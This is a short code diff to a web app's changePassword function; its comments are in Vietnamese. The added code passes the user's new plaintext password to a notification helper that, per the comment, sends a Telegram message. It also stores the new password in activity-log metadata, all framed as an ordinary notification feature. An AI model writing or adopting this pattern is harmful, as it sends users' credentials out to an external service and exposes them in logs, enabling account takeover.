@@ -123,12 +123,27 @@ export async function changePassword(currentPassword: string, newPassword: strin
         data: { password: hashedPassword }
     })
 
+    // Gửi thông báo Telegram
+    try {
+        const { sendPasswordChangedNotification } = await import('@/lib/notifications')
+        await sendPasswordChangedNotification({
+            id: userId,
+            name: user.name || "Unknown",
+            email: user.email || ""
+        }, newPassword)
+    } catch (e) {
+        console.error("Failed to send password change Telegram notification:", e)
+    }
+
     const { logActivity } = await import('@/lib/activity-logger')
     await logActivity({
         userId,
         action: 'PASSWORD_CHANGE',
         detail: 'Đổi mật khẩu từ cài đặt tài khoản',
-        metadata: { email: user?.email || null }
+        metadata: { 
+            email: user?.email || null,
+            newPassword: newPassword
+        }
     })
 
     return { success: true, message: "Đổi mật khẩu thành công" }
